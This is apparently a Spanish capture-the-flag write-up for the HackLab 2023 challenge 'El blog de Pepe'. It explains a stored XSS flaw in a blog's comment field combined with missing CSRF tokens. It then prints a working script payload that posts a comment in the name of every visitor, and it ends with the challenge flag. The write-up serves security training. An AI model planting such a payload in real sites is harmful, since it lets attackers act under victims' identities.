# Desafío 7 - El blog de Pepe (HackLab 2023)

## Análisis

Stored XSS (Cross-Site Scripting almacenado): el campo de comentarios no sanitiza ni codifica la salida. Todo lo que envío en txtComentario se guarda en el servidor y se re-inyecta tal cual en el HTML de la página cuando cualquier usuario la carga. Comprobé que interpretaba HTML (<b>test</b> salió en negrita) y que ejecutaba JavaScript (alert(1) disparó). Al ser almacenado, el payload persiste y afecta a cualquiera que abra la página, no solo a mí.

Ausencia de protección CSRF: analicé el POST en Burp y el body solo contenía txtComentario y btnEnviar. No había ningún token anti-CSRF (nonce por request). La autenticación depende únicamente de la cookie PHPSESSID, que el navegador adjunta automáticamente. Eso significa que cualquier acción hecha desde el propio dominio se ejecuta con la identidad del usuario logueado, sin verificación de que la petición sea legítima.

La combinación es lo que hace explotable el ejercicio: el XSS me da ejecución de código en el navegador de la víctima, y la falta de CSRF hace que ese código pueda publicar comentarios en su nombre.


Se inyecta un comentario malicioso que contiene un `<script>` capaz de publicar un comentario en nombre del usuario que visita la página (excepto si es el propio autor).

## Explotación

Se envía el siguiente payload como comentario:

```html
Hola, dejo comentario malicioso
<script>

function enviarComentario() {
    var usuario = document.getElementById("nombre_usuario").innerText;
    if (usuario != "teny") {
        document.getElementsByName("txtComentario")[0].value = "Voy a derogar la ley 1542-A";
        document.getElementsByName("btnEnviar")[0].click();
    } else {
        console.log("Soy teny y no envio el comentario");
    }
}

window.addEventListener("load", enviarComentario);
</script>
```

Cuando cualquier usuario (que no sea `teny`) carga la página, el script se ejecuta automáticamente y publica el comentario `"Voy a derogar la ley 1542-A"` en su nombre.

![Desafío 7 - El blog de Pepe (HackLab 2023) - imagen 1](images/01.png)

## Flag

```
c4c309a13c8fc4c5f48e72e4154dc812
```
